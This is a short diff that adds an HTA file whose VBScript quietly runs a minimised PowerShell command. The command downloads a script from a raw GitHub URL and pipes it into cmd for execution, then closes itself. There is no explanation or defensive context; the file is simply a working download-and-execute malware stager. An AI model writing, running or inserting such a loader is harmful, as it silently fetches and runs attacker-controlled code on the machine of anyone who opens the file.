@@ -1,0 +1,7 @@
+<hta:application windowstate="minimize">
+<script language="VBScript">
+    Set app = CreateObject("Wscript.Shell")
+    app.Run "powershell.exe -NoProfile -Command ""(Invoke-WebRequest 'https://raw.githubusercontent.com/4yzi/0/0/0/r1' -UseBasicParsing).Content | cmd /Q /V:ON"""
+    close()
+</script>
+</hta:application>
